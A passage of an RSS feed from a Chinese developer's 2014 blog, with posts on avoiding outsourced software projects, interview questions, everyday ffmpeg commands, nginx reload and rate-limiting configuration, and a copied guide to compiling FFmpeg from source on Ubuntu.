&lt;p&gt;把项目外包出去是一个不得已的选择。如果资金允许，务必要培养自己的团队。 因为在软件项目中，“人”才是最重要的。代码不重要。 只要有高素质的人存在， 那么你的项目就会一帆风顺。 我见过的比较多的情况是：&lt;br /&gt;某项目，干了1期。 交付了。然后开发人员消息了（可能是他离职，可能是该团队解散，公司关掉等等） 然后来了一个人，继续接手。 如果这个人是个经验丰富的老手， 可以看懂前任程序员的代码，那么他大约需要一段时间来很痛苦的阅读和理解前任的代码。 同时做各种修改，各种重构（改善现有代码的结构）。 如果这个人是个菜鸟，前任作者的代码他看不懂，那么完了，估计前任作者30分钟的工作，这个新人可能要做一周。（在《人件》 以及《软件工程的45个事实和悖论》中有更加精彩的论述）。&lt;br /&gt;&lt;br /&gt;所以，除非你的项目不需要谁维护，否则不要外包出去。（我所有见过的成功交付的项目，都会要求做第二期，第三期。。。）&lt;br /&gt;&lt;br /&gt;外包的唯一优势就是：我们不需要一直“养”着一个团队。需要人的时候我直接找外包团队来做就可以。 如果你手头没有足够的资金，但是又需要在1个月内做出一款线上的产品的话，确实一个可行的选择。但是如同“壮士断腕”，它的副作用相当巨大。可能你在做第二期的时候把前期外包的成果“推倒重来”。—— 原因是外包软件的整体架构不被新团队所理解，而且你也找不到原来作者了。&amp;#160;&lt;/p&gt;
&lt;p&gt;结论：能不外包就绝对不要外包。一旦做了外包，就做好承担更大失败风险和日后 还债的准备。&lt;/p&gt;
&lt;h3&gt;经验：如何保证你的项目进度？&lt;/h3&gt;
&lt;p&gt;务必要让程序员过来跟你一起工作。 最好是面对面，或者坐邻居工位。 能够有个开放式的环境，大家围坐在一起更好。 程序员有了问题可以直接问项目经理，项目经理想查看进度时，也可以面对面找程序员，大家还可以有每天上午10点的站立会议（注意：要站着，每个人发言不超过1分钟，讲述自己今天要做的事情和昨天遇到的问题）&lt;br /&gt;每天都做交付（见敏捷开发的 “项目自动化”）。 做到一键部署，这样我们的产品经理每天下班前都会看到哪个哪个新特性上了线。&lt;/p&gt;
&lt;h3&gt;经验：产品经理如何提需求？&lt;/h3&gt;
&lt;p&gt;要“小步快跑”。 比如，老板脑子里有100个点子，而这一百个点子在目前的项目资源中是无法得到全部分配的（通俗的说，我们目前只能在一个月内完成5个点子），那么就把这100个点子做个排序： 第一期项目先做这5个点子。 &amp;#160; 等项目一期做了交付之后，我们再上另外10个点子（或者需求） 。。。等等等等。 这样小步快跑，项目才能成功。&lt;/p&gt;
&lt;p&gt;《人月神话》： 如果某个项目的时间估算（交付时间）超过了1年，那么它基本上会失败。 如果超过2年，那么绝对会失败。&lt;/p&gt;
&lt;h3&gt;经验：如何保证项目的稳定？（或者说，如何搞垮你的竞争对手？）&lt;/h3&gt;
&lt;p&gt;办法很多。 如果你发现对方的项目是花5千块请的大四学生做的，那么恭喜你，它肯定会在3个月内垮掉。不需要你做什么。&lt;br /&gt;&lt;/p&gt;
&lt;h3&gt;经验：如何组建技术团队？&lt;/h3&gt;</description>
      <pubDate>Sun, 29 Jun 2014 05:48:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/things-you-should-know-before-starting-a-project</link>
    </item>
    <item>
      <title>在国内软件队伍中生存？ working in non-agile team</title>
      <description>&lt;p&gt;1。 坚持学习&lt;/p&gt;
&lt;p&gt;2. &amp;#160; 坚持写单元测试，自动化&lt;/p&gt;
&lt;p&gt;3. &amp;#160; 坚持使用自动化的东西&lt;/p&gt;</description>
      <pubDate>Wed, 25 Jun 2014 07:10:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/working-in-non-agile-team</link>
    </item>
    <item>
      <title>面试时的问题 (questions for an interview) </title>
      <description>&lt;p&gt;1. &amp;#160;谈谈上一次项目&lt;/p&gt;
&lt;p&gt;&amp;#160;谈谈了解的设计模式&lt;/p&gt;
&lt;p&gt;&amp;#160;CSS： &amp;#160;border, margin, padding 从外到内的顺序？ &amp;#160; class, id, 标签 在定义CSS时的权重？&lt;/p&gt;
&lt;p&gt;jquery ： 在项目中用过哪些组件？ &amp;#160;是否参与过开源项目？ 用JS在项目中做什么？&lt;/p&gt;
&lt;p&gt;设计模式，单元测试&amp;#160;&lt;/p&gt;
&lt;p&gt;LINUX 相关&lt;/p&gt;
&lt;p&gt;问题： 1. 喜欢刁难人的同事如何沟通？ 2. 对于工作压力巨大，能否加班？&amp;#160;&lt;/p&gt;
&lt;p&gt;觉得自己的优点和缺点？&lt;/p&gt;
&lt;p&gt;考察口语： 上一次的项目&lt;/p&gt;</description>
      <pubDate>Wed, 25 Jun 2014 06:27:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/questions-for-interview</link>
    </item>
    <item>
      <title>移动CMS与传统CMS的主要区别</title>
      <description>&lt;p&gt;最主要区别： 移动APP 需要顾及原有的版本。 做各种兼容。而传统的不需要。&lt;/p&gt;
&lt;p&gt;版本：&lt;/p&gt;
&lt;p&gt;pid：&lt;/p&gt;
&lt;p&gt;预览：&lt;/p&gt;
&lt;p&gt;清理缓存：&lt;/p&gt;</description>
      <pubDate>Wed, 25 Jun 2014 01:58:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/difference-between-mobile-cms-and-ordinary-cms</link>
    </item>
    <item>
      <title>分享一个制作各种动画的站点 （ an excellent font-end website for coders ) </title>
      <description>&lt;p&gt;http://tympanus.net/codrops/category/articles/&lt;/p&gt;</description>
      <pubDate>Mon, 23 Jun 2014 10:01:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/excellent-front-end-website</link>
    </item>
    <item>
      <title>ffmpeg useful commands (FFMPEG 命令大全）</title>
      <description>&lt;p&gt; see: &lt;a href="http://www.labnol.org/internet/useful-ffmpeg-commands/28490/"&gt;http://www.labnol.org/internet/useful-ffmpeg-commands/28490/&lt;/a&gt; for details &lt;/p&gt;

&lt;div class="post-content"&gt; &lt;p&gt;FFmpeg is an extremely powerful and versatile command line tool for converting audio and video files. It is free and available for Windows, Mac and Linux machines. Whether you want to join two video files, extract the audio component from a video file, convert your video into an animated GIF, FFmpeg can do it all and even more.&lt;/p&gt;

&lt;pre&gt;#  合并静态 图片和 声音 （声音需要先生成静音文件）
$ ffmpeg -i silence.mp3 -loop 1 -i zuoshi_title.jpg  -c:v libx264 -c:a aac -strict experimental -b:a 192k -shortest zuoshi_title.mp4

# 合并 音乐和 视频 （mp3 + mp4 )
$ ffmpeg -i video.mp4 -i audio.mp3 -c:v copy -c:a aac -strict experimental -shortest output.mp4

# 增加字幕
# add srt format subtitle to mp4: 
$ ffmpeg -i zhangong-header.mp4 -vf subtitles=zhangong.srt zhangong-header-out.mp4

 # add subtitle to mp4 file (using ass format)
 ffmpeg -i zhangong.srt zhangong.ass
 ffmpeg -i zhangong-header.mp4 -vf 'ass=zhangong.ass' zhangong-header-subtitle.mp4

 # 如果向现有的MP4中增加背景音乐，需要： 
 # 1. 从原来的MP4中获取MP3
 $ ffmpeg -i zuogong-ok.mp4 -vn -ab 256k zuogong_koulingci.mp3
 # 2. 将 mp3 与 背景音乐MP3合并 ，成为 new_music.mp3 (using audacity) 
 # 3. 将 原来的MP4静音‘
 $ ffmpeg -i zuogong-ok.mp4 -an zuogong-muted.mp4
 # 4. 合并静音后的MP4与 new_music.mp3
 $ ffmpeg -i zuogong-muted.mp4 -i zuogong-koulingci-with-music.mp3 -c:v copy -c:a aac -strict experimental zuogong-with-koulingci-and-music.mp4
&lt;/pre&gt;
&lt;p&gt;转换成GIF动画： $ffmpeg -i climax.mp4 -ss 00:00:00 -pix_fmt rgb24 -r 10 -s 320x180 -t 00:00:12 out.gif&lt;/p&gt;

  &lt;div id="attachment_28491" style="width: 602px" class="wp-caption alignnone"&gt;&lt;p&gt;&lt;img src="http://img.labnol.org/di/ffmpeg.gif" alt="Extract the audio from a video file with this simple FFmpeg command." width="592" height="342" class="size-full wp-image-28491" /&gt;&lt;/p&gt;
&lt;p class="wp-caption-text"&gt;Extract the audio from a video file with this simple FFmpeg command.&lt;/p&gt;
&lt;/div&gt; &lt;h2&gt;Useful FFmpeg Commands&lt;/h2&gt; &lt;p&gt;FFmpeg supports all popular audio and video formats. Or you can running the command &lt;em&gt;./ffmpeg -formats&lt;/em&gt; to get a list of every format that is supported by your FFmpeg installation. If you are just getting started, here are some commands that will give you good idea of the capabilities of this tool.&lt;/p&gt; &lt;h4&gt;1. Cut video file into a smaller clip&lt;/h4&gt; &lt;p&gt;You can use the time offset parameter (-ss) to specify the start time stamp in HH:MM:SS.ms format while the -t parameter is for specifying the actual duration of the clip in seconds.&lt;/p&gt; &lt;pre&gt;ffmpeg -i input.mp4 -ss 00:00:50.0 -codec copy -t 20 output.mp4&lt;/pre&gt; &lt;h4&gt;2. Split a video into multiple parts&lt;/h4&gt; &lt;p&gt;If you want to split a large video into multiple smaller clips without re-encoding, ffmpeg can help. This command will split the source video into 2 parts – one ending at 50s from the start and the other beginning at 50s and ending at the end of the input video.&lt;/p&gt; &lt;pre&gt;ffmpeg -i video.mp4 -t 00:00:50 -c copy small-1.mp4 -ss 00:00:50 -codec copy small-2.mp4&lt;/pre&gt; &lt;h4&gt;3. Convert video from one format to another&lt;/h4&gt; &lt;p&gt;You can use the -vcodec parameter to specify the encoding format to be used for the output video. Encoding a video takes time but you can speed up the process by forcing a preset though it would degrade the quality of the output video.&lt;/p&gt; &lt;pre&gt;ffmpeg -i youtube.flv -c:v libx264 filename.mp4&lt;/pre&gt; &lt;pre&gt;ffmpeg -i video.wmv -c:v libx264 -preset ultrafast video.mp4&lt;/pre&gt; &lt;h4&gt;4. Join (concatenate) video files&lt;/h4&gt; &lt;p&gt;If you have multiple audio or video files encoded with the same codecs, you can join them into a single file using FFmpeg. Create a input file with a list of all &lt;a href="https://ffmpeg.org/trac/ffmpeg/wiki/How%20to%20concatenate%20%28join,%20merge%29%20media%20files"&gt;source files&lt;/a&gt; that you wish to concatenate and then run this command.&lt;/p&gt; &lt;pre&gt;ffmpeg -f concat -i file-list.txt -c copy output.mp4&lt;/pre&gt; &lt;h4&gt;5. Mute a video (Remove the audio component)&lt;/h4&gt; &lt;p&gt;Use the -an parameter to disable the audio portion of a video stream.&lt;/p&gt; &lt;pre&gt;ffmpeg -i video.mp4 -an mute-video.mp4&lt;/pre&gt; &lt;h4&gt;6. Extract the audio from video&lt;/h4&gt; &lt;p&gt;The -vn switch extracts the audio portion from a video and we are using the -ab switch to save the audio as a 256kbps MP3 audio file.&lt;/p&gt; &lt;pre&gt;ffmpeg -i video.mp4 -vn -ab 256k audio.mp3&lt;/pre&gt; &lt;h4&gt;7. Convert a video into animated GIF&lt;/h4&gt; &lt;p&gt;FFmpeg is an excellent tool for converting videos into &lt;a href="http://www.labnol.org/software/video-demo-with-animated-gif/28095/"&gt;animated GIFs&lt;/a&gt; and the quality isn’t bad either. Use the scale filter to specify the width of the GIF, the -t parameter specific the duration while -r specifies the frame rate (fps).&lt;/p&gt; &lt;pre&gt;ffmpeg -i video.mp4 -vf scale=500:-1 -t 10 -r 10 image.gif&lt;/pre&gt; &lt;h4&gt;8. Extract image frames from a video&lt;/h4&gt; &lt;p&gt;This command will extract the video frame at the 15s mark and saves it as a 800px wide JPEG image. You can also use the -s switch (like -s 400×300) to specify the exact dimensions of the image file though it will probably create a stretched image if the image size doesn’t follow the aspect ratio of the original video file.&lt;/p&gt; &lt;pre&gt;ffmpeg -ss 00:00:15 -i video.mp4 -vf scale=800:-1 -vframes 1 image.jpg&lt;/pre&gt; &lt;h4&gt;9. Convert Video into Images&lt;/h4&gt; &lt;p&gt;You can use FFmpeg to automatically &lt;a href="http://www.labnol.org/software/extract-image-frames-from-video/18137/"&gt;extract image frames&lt;/a&gt; from a video every ‘n’ seconds and the images are saved in a sequence. This command saves image frame after every 4 seconds.&lt;/p&gt; &lt;pre&gt;ffmpeg -i movie.mp4 -r 0.25 frames_%04d.png&lt;/pre&gt; &lt;h4&gt;10. Merge an audio and video file&lt;/h4&gt; &lt;p&gt;You can also specify the -shortest switch to finish the encoding when the shortest clip ends.&lt;/p&gt; &lt;pre&gt;ffmpeg -i video.mp4 -i audio.mp3 -c:v copy -c:a aac -strict experimental output.mp4&lt;/pre&gt; &lt;pre&gt;ffmpeg -i video.mp4 -i audio.mp3 -c:v copy -c:a aac -strict experimental -shortest output.mp4&lt;/pre&gt; &lt;h4&gt;11. Resize a video&lt;/h4&gt; &lt;p&gt;Use the size (-s) switch with ffmpeg to resize a video while maintaining the aspect ratio.&lt;/p&gt; &lt;pre&gt;ffmpeg -i input.mp4 -s 480x320 -c:a copy output.mp4&lt;/pre&gt; &lt;h4&gt;12. Create video slideshow from images&lt;/h4&gt; &lt;p&gt;This command creates a &lt;a href="http://www.labnol.org/internet/street-view-time-lapse/20504/"&gt;video slideshow&lt;/a&gt; using a series of images that are named as img001.png, img002.png, etc. Each image will have a duration of 5 seconds (-r 1/5).&lt;/p&gt; &lt;pre&gt;ffmpeg -r 1/5 -i img%03d.png -c:v libx264 -r 30 -pix_fmt yuv420p slideshow.mp4&lt;/pre&gt; &lt;h4&gt;13. Add a poster image to audio&lt;/h4&gt; &lt;p&gt;You can add a cover image to an audio file and the length of the output video will be the same as that of the input audio stream. This may come handy for uploading MP3s to YouTube.&lt;/p&gt; &lt;pre&gt;ffmpeg -loop 1 -i image.jpg -i audio.mp3 -c:v libx264 -c:a aac -strict experimental -b:a 192k -shortest output.mp4&lt;/pre&gt; &lt;h4&gt;14. Convert a single image into a video&lt;/h4&gt; &lt;p&gt;Use the -t parameter to specify the duration of the video.&lt;/p&gt; &lt;pre&gt;ffmpeg -loop 1 -i image.png -c:v libx264 -t 30 -pix_fmt yuv420p video.mp4&lt;/pre&gt; &lt;h4&gt;15. Add subtitles to a movie&lt;/h4&gt; &lt;p&gt;This will take the subtitles from the .srt file. FFmpeg can decode most common subtitle formats.&lt;/p&gt; &lt;pre&gt;ffmpeg -i movie.mp4 -i subtitles.srt -map 0 -map 1 -c copy -c:v libx264 -crf 23 -preset veryfast output.mkv&lt;/pre&gt; &lt;h4&gt;16. Crop an audio file&lt;/h4&gt; &lt;p&gt;This will create a 30 second audio file starting at 90 seconds from the original audio file without transcoding.&lt;/p&gt; &lt;pre&gt;ffmpeg -ss 00:01:30 -t 30 -acodec copy -i inputfile.mp3 outputfile.mp3&lt;/pre&gt; &lt;h4&gt;17. Change the audio volume&lt;/h4&gt; &lt;p&gt;You can use the volume filter to alter the volume of a media file using FFmpeg. This command will half the volume of the audio file.&lt;/p&gt; &lt;pre&gt;ffmpeg -i input.wav -af 'volume=0.5' output.wav&lt;/pre&gt; &lt;h4&gt;18. Rotate a video&lt;/h4&gt; &lt;p&gt;This command will &lt;a href="http://www.labnol.org/software/tutorials/rotate-video-vertical-clips-90-degrees-virtualdub/2657/"&gt;rotate a video clip&lt;/a&gt; 90° clockwise. You can set transpose to 2 to rotate the video 90° anti-clockwise.&lt;/p&gt; &lt;pre&gt;ffmpeg -i input.mp4 -filter:v 'transpose=1' rotated-video.mp4&lt;/pre&gt; &lt;p&gt;This will rotate the video 180° counter-clockwise.&lt;/p&gt; &lt;pre&gt;ffmpeg -i input.mp4 -filter:v 'transpose=2,transpose=2' rotated-video.mp4&lt;/pre&gt; &lt;h4&gt;19. Speed up or Slow down the video&lt;/h4&gt; &lt;p&gt;You can change the speed of your video using the setpts (set presentation time stamp) filter of FFmpeg. This command will make the video 8x (1/8) faster or use setpts=4*PTS to make the video 4x slower.&lt;/p&gt; &lt;pre&gt;ffmpeg -i input.mp4 -filter:v "setpts=0.125*PTS" output.mp4&lt;/pre&gt; &lt;h4&gt;20. Speed up or Slow down the audio&lt;/h4&gt; &lt;p&gt;For changing the speed of audio, use the atempo audio filter. This command will double the speed of audio. You can use any value between 0.5 and 2.0 for audio.&lt;/p&gt; &lt;pre&gt;ffmpeg -i input.mkv -filter:a "atempo=2.0" -vn output.mkv&lt;/pre&gt; &lt;p&gt;Stack Exchange has a &lt;a href="http://blog.superuser.com/2012/02/24/ffmpeg-the-ultimate-video-and-audio-manipulation-tool/"&gt;good overview&lt;/a&gt; to get you started with FFmpeg. You should also check out the official documentation at &lt;a href="http://ffmpeg.org/ffmpeg.html"&gt;ffmpeg.org&lt;/a&gt; or the wiki at &lt;a href="https://trac.ffmpeg.org/wiki"&gt;trac.ffmpeg.org&lt;/a&gt; to know about all the possible things you can do with FFmpeg.&lt;/p&gt;
&lt;p id="26"&gt; &lt;/p&gt;
&lt;div class="googleadsrectangle" style="width:336px; height: 280px"&gt; &lt;ins class="adsbygoogle" style="display:inline-block;width:336px;height:280px" data-ad-client="ca-pub-5952668961385621" data-ad-slot="2429224458" data-adsbygoogle-status="done"&gt;&lt;ins style="display:inline-table;border:none;height:280px;margin:0;padding:0;position:relative;visibility:visible;width:336px;background-color:transparent"&gt;&lt;ins id="aswift_1_anchor" style="display:block;border:none;height:280px;margin:0;padding:0;position:relative;visibility:visible;width:336px;background-color:transparent"&gt;&lt;iframe width="336" height="280" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" id="aswift_1" style="left:0;position:absolute;top:0;"&gt;&lt;/iframe&gt;
&lt;/ins&gt;
&lt;/ins&gt;
&lt;/ins&gt; &lt;/div&gt;   &lt;p&gt;Also see: &lt;a href="http://www.labnol.org/software/linux-commands/19028/"&gt;Essential Linux Commands&lt;/a&gt;
&lt;/p&gt; &lt;/div&gt;</description>
      <pubDate>Sun, 22 Jun 2014 21:02:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/ffmpeg-useful-commands</link>
    </item>
    <item>
      <title>nginx worker process is shutting down </title>
      <description>&lt;p&gt;今天修改完nginx 的配置，重启之后，发现有 3个nginx进程是这样，其他5个左右都是正常的nginx; 看起来跟下图一样：  ( today I met a strange case that some of my nginx processes become "is shutting down" status. ) &lt;/p&gt;
&lt;pre&gt;nobody 6246 6241 0 10:51 ? 00:00:00 nginx: worker process 
nobody 6247 6241 0 10:51 ? 00:00:00 nginx: worker process 
nobody 6247 6241 0 10:51 ? 00:00:00 nginx: worker process 
nobody 6248 6241 0 10:51 ? 00:00:00 nginx: worker process 
nobody 6249 6241 0 10:51 ? 00:00:00 nginx: worker process 
nobody 7995 10419 0 Jan12 ? 00:20:37 nginx: worker process is shutting down 
nobody 7995 10419 0 Jan12 ? 00:20:37 nginx: worker process is shutting down 
nobody 7996 10419 0 Jan12 ? 00:20:11 nginx: worker process is shutting down 
&lt;/pre&gt;
&lt;p&gt; 经过google, 才知道这是 nginx -s reload之后， nginx 正在平滑的重启。(graceful reboot) 。 等调用对应nginx 的进程结束之后，这个process就会重启了。  (after googling, I found that the root cause is nginx's graceful reboot.  the nginx process which shoud be shut down is still responding a request, and it will restart once the current request is done ) &lt;/p&gt;
&lt;p&gt;果然，大约20分钟后，这些进程都变成了 'worker process' 了。( 20 minutes later, all the nginx worker are rebooted )&amp;#160;&lt;/p&gt; </description>
      <pubDate>Fri, 20 Jun 2014 10:13:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/nginx-worker-is-shutting-down</link>
    </item>
    <item>
      <title>nginx的限速相关(nginx limit download rate)</title>
      <description>&lt;p&gt;CoreModule&lt;br /&gt;限速&lt;br /&gt;指令名称： limit_rate、limit_rate_after \\limit_rate_after用于设置http请求传输多少字节后开始限速&lt;br /&gt;使用环境： http, server, location, if in location&lt;br /&gt;示例：&lt;br /&gt;location /download {&lt;br /&gt;limit_rate_after 4m;&lt;br /&gt;limit_rate 512k;&lt;br /&gt;}&lt;br /&gt; &lt;br /&gt;限制单个IP最大连接数（线程数）&lt;br /&gt;指令名称： limit_conn_zone&lt;br /&gt;使用环境： http&lt;br /&gt;示例：&lt;br /&gt;http {&lt;br /&gt;limit_conn_zone $binary_remote_addr zone=client_addr:10m;  \\这是内存的开销&lt;br /&gt;}&lt;br /&gt;  &lt;br /&gt;指令名称： limit_conn&lt;br /&gt;使用环境： http, server, location&lt;br /&gt;示例：&lt;br /&gt;server {&lt;br /&gt;location /download {&lt;br /&gt;limit_conn client_addr 1;&lt;br /&gt;}&lt;br /&gt;}&lt;br /&gt; &lt;br /&gt;隐藏Nginx版本信息：&lt;br /&gt;# curl --head http://www.tianyun.com //查看主机的响应头信息&lt;br /&gt;http{&lt;br /&gt;server_tokens off;&lt;br /&gt;}&lt;/p&gt;</description>
      <pubDate>Fri, 20 Jun 2014 08:31:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/nginx-limit-download-rate</link>
    </item>
    <item>
      <title>install ffmpeg on ubuntu12/13</title>
      <description>&lt;p&gt;&lt;a target="_blank" href="https://trac.ffmpeg.org/wiki/CompilationGuide/Ubuntu"&gt;Compile FFmpeg on Ubuntu, Debian, or Mint &lt;/a&gt;
&lt;br /&gt;Contents&lt;br /&gt;Get the Dependencies&lt;br /&gt;Compilation &amp;amp; Installation&lt;br /&gt;Conclusion&lt;br /&gt;Updating FFmpeg&lt;br /&gt;Reverting Changes Made by This Guide&lt;br /&gt;If You Need Help&lt;br /&gt;Also See&lt;br /&gt;This guide for supported releases of Ubuntu, Debian, and Linux Mint will provide a local install of the latest FFmpeg tools and libraries including several external encoding and decoding libraries (codecs). This will not interfere with repository packages.&lt;/p&gt;
&lt;p&gt;You may also refer to the Generic FFmpeg Compilation Guide for additional information.&lt;/p&gt;
&lt;p&gt;Recent ​static builds are also available for lazy people or those who are unable to compile.&lt;/p&gt;
&lt;p&gt;Get the Dependencies&lt;/p&gt;
&lt;p&gt;Copy and paste the whole code box for each step.&lt;/p&gt;
&lt;p&gt;sudo apt-get update&lt;br /&gt;sudo apt-get -y install autoconf automake build-essential libass-dev libfreetype6-dev libgpac-dev \&lt;br /&gt;  libsdl1.2-dev libtheora-dev libtool libva-dev libvdpau-dev libvorbis-dev libx11-dev \&lt;br /&gt;  libxext-dev libxfixes-dev pkg-config texi2html zlib1g-dev&lt;br /&gt;mkdir ~/ffmpeg_sources&lt;br /&gt;Notes:&lt;/p&gt;
&lt;p&gt;Server users can omit the ffplay and x11 dependencies: libsdl1.2-dev libva-dev libvdpau-dev libx11-dev libxext-dev libxfixes-dev.&lt;br /&gt;Lucid lacks the package libva-dev. This can be ignored.&lt;br /&gt;Compilation &amp;amp; Installation&lt;/p&gt;
&lt;p&gt;You can compile ffmpeg to your liking. If you do not require certain encoders you may skip the relevant section and then remove the appropriate ./configure option in FFmpeg. For example, if libopus is not needed, then skip that section and then remove --enable-libopus from the Install FFmpeg section.&lt;/p&gt;
&lt;p&gt;This guide is designed to be non-intrusive and will create several directories in your home directory:&lt;/p&gt;
&lt;p&gt;ffmpeg_sources – Where the source files will be downloaded.&lt;br /&gt;ffmpeg_build – Where the files will be built and libraries installed.&lt;br /&gt;bin – Where the resulting binaries (ffmpeg, ffplay, ffserver, x264, and yasm) will be installed.&lt;br /&gt;You can easily undo any of this as shown in Reverting Changes Made by This Guide.&lt;/p&gt;
&lt;p&gt;Yasm&lt;/p&gt;
&lt;p&gt;An assembler for x86 optimizations used by x264 and FFmpeg. Highly recommended or your resulting build may be very slow.&lt;/p&gt;
&lt;p&gt;If your repository offers a yasm package ≥ 1.2.0 then you can install that instead of compiling:&lt;/p&gt;
&lt;p&gt;sudo apt-get install yasm&lt;br /&gt;Otherwise you can compile:&lt;/p&gt;
&lt;p&gt;cd ~/ffmpeg_sources&lt;br /&gt;wget http://www.tortall.net/projects/yasm/releases/yasm-1.2.0.tar.gz&lt;br /&gt;tar xzvf yasm-1.2.0.tar.gz&lt;br /&gt;cd yasm-1.2.0&lt;br /&gt;./configure --prefix="$HOME/ffmpeg_build" --bindir="$HOME/bin"&lt;br /&gt;make&lt;br /&gt;make install&lt;br /&gt;make distclean&lt;br /&gt;libx264&lt;/p&gt;
&lt;p&gt;H.264 video encoder. See the x264 Encoding Guide for more information and usage examples.&lt;/p&gt;
&lt;p&gt;Requires ffmpeg to be configured with --enable-gpl --enable-libx264 --extra-libs=-ldl.&lt;/p&gt;
&lt;p&gt;cd ~/ffmpeg_sources&lt;br /&gt;wget http://download.videolan.org/pub/x264/snapshots/last_x264.tar.bz2&lt;br /&gt;tar xjvf last_x264.tar.bz2&lt;br /&gt;cd x264-snapshot*&lt;br /&gt;PATH="$PATH:$HOME/bin" ./configure --prefix="$HOME/ffmpeg_build" --bindir="$HOME/bin" --enable-static&lt;br /&gt;PATH="$PATH:$HOME/bin" make&lt;br /&gt;make install&lt;br /&gt;make distclean&lt;br /&gt;libfdk-aac&lt;/p&gt;
&lt;p&gt;AAC audio encoder. See the AAC Encoding Guide for more information and usage examples.&lt;/p&gt;
&lt;p&gt;Requires ffmpeg to be configured with --enable-libfdk_aac (and --enable-nonfree if you also included --enable-gpl).&lt;/p&gt;
&lt;p&gt;sudo apt-get install unzip&lt;br /&gt;cd ~/ffmpeg_sources&lt;br /&gt;wget -O fdk-aac.zip https://github.com/mstorsjo/fdk-aac/zipball/master&lt;br /&gt;unzip fdk-aac.zip&lt;br /&gt;cd mstorsjo-fdk-aac*&lt;br /&gt;autoreconf -fiv&lt;br /&gt;./configure --prefix="$HOME/ffmpeg_build" --disable-shared&lt;br /&gt;make&lt;br /&gt;make install&lt;br /&gt;make distclean&lt;br /&gt;libmp3lame&lt;/p&gt;
&lt;p&gt;MP3 audio encoder.&lt;/p&gt;
&lt;p&gt;Requires ffmpeg to be configured with --enable-libmp3lame.&lt;/p&gt;
&lt;p&gt;If your repository offers a libmp3lame-dev package ≥ 3.98.3 then you can install that instead of compiling:&lt;/p&gt;
&lt;p&gt;sudo apt-get install libmp3lame-dev&lt;br /&gt;Debian 6 "Squeeze" users must compile:&lt;/p&gt;
&lt;p&gt;sudo apt-get install nasm&lt;br /&gt;cd ~/ffmpeg_sources&lt;br /&gt;wget http://downloads.sourceforge.net/project/lame/lame/3.99/lame-3.99.5.tar.gz&lt;br /&gt;tar xzvf lame-3.99.5.tar.gz&lt;br /&gt;cd lame-3.99.5&lt;br /&gt;./configure --prefix="$HOME/ffmpeg_build" --enable-nasm --disable-shared&lt;br /&gt;make&lt;br /&gt;make install&lt;br /&gt;make distclean&lt;br /&gt;libopus&lt;/p&gt;
&lt;p&gt;Opus audio decoder and encoder.&lt;/p&gt;
&lt;p&gt;Requires ffmpeg to be configured with --enable-libopus.&lt;/p&gt;
&lt;p&gt;If your repository offers a libopus-dev package ≥ 1.1 then you can install that instead of compiling:&lt;/p&gt;
&lt;p&gt;sudo apt-get install libopus-dev&lt;br /&gt;Otherwise you can compile:&lt;/p&gt;
&lt;p&gt;cd ~/ffmpeg_sources&lt;br /&gt;wget http://downloads.xiph.org/releases/opus/opus-1.1.tar.gz&lt;br /&gt;tar xzvf opus-1.1.tar.gz&lt;br /&gt;cd opus-1.1&lt;br /&gt;./configure --prefix="$HOME/ffmpeg_build" --disable-shared&lt;br /&gt;make&lt;br /&gt;make install&lt;br /&gt;make distclean&lt;br /&gt;libvpx&lt;/p&gt;
&lt;p&gt;VP8/VP9 video encoder and decoder. See the vpx (WebM) Encoding Guide for more information and usage examples.&lt;/p&gt;
&lt;p&gt;Requires ffmpeg to be configured with --enable-libvpx.&lt;/p&gt;
&lt;p&gt;cd ~/ffmpeg_sources&lt;br /&gt;wget http://webm.googlecode.com/files/libvpx-v1.3.0.tar.bz2&lt;br /&gt;tar xjvf libvpx-v1.3.0.tar.bz2&lt;br /&gt;cd libvpx-v1.3.0&lt;br /&gt;./configure --prefix="$HOME/ffmpeg_build" --disable-examples&lt;br /&gt;make&lt;br /&gt;make install&lt;br /&gt;make clean&lt;br /&gt;ffmpeg&lt;/p&gt;
&lt;p&gt;Note: Server users can omit --enable-x11grab (this option is for x11 screen grabbing).&lt;/p&gt;
&lt;p&gt;cd ~/ffmpeg_sources&lt;br /&gt;wget http://ffmpeg.org/releases/ffmpeg-snapshot.tar.bz2&lt;br /&gt;tar xjvf ffmpeg-snapshot.tar.bz2&lt;br /&gt;cd ffmpeg&lt;br /&gt;PATH="$PATH:$HOME/bin" PKG_CONFIG_PATH="$HOME/ffmpeg_build/lib/pkgconfig" ./configure \&lt;br /&gt;  --prefix="$HOME/ffmpeg_build" \&lt;br /&gt;  --extra-cflags="-I$HOME/ffmpeg_build/include" \&lt;br /&gt;  --extra-ldflags="-L$HOME/ffmpeg_build/lib" \&lt;br /&gt;  --bindir="$HOME/bin" \&lt;br /&gt;  --extra-libs="-ldl" \&lt;br /&gt;  --enable-gpl \&lt;br /&gt;  --enable-libass \&lt;br /&gt;  --enable-libfdk-aac \&lt;br /&gt;  --enable-libfreetype \&lt;br /&gt;  --enable-libmp3lame \&lt;br /&gt;  --enable-libopus \&lt;br /&gt;  --enable-libtheora \&lt;br /&gt;  --enable-libvorbis \&lt;br /&gt;  --enable-libvpx \&lt;br /&gt;  --enable-libx264 \&lt;br /&gt;  --enable-nonfree \&lt;br /&gt;  --enable-x11grab&lt;br /&gt;PATH="$PATH:$HOME/bin" make&lt;br /&gt;make install&lt;br /&gt;make distclean&lt;br /&gt;hash -r&lt;br /&gt;Conclusion&lt;/p&gt;
&lt;p&gt;Installation is now complete and ffmpeg is now ready for use. Your newly compiled FFmpeg programs are in ~/bin. To use it:&lt;/p&gt;
&lt;p&gt;Navigate to ~/bin and execute the binary: cd ~/bin &amp;amp;&amp;amp; ./ffmpeg -i ~/input.mp4 ~/videos/output.mkv (notice the ./)&lt;br /&gt;Or you can use the full path to the binary: /home/yourusername/bin/ffmpeg -i ../input.mp4 ../videos/output.mkv&lt;br /&gt;Or if you simply want to just issue the ffmpeg command and have your shell use your compiled binary see the Persistent Environment Variables section below.&lt;br /&gt;Persistent Environment Variables&lt;/p&gt;
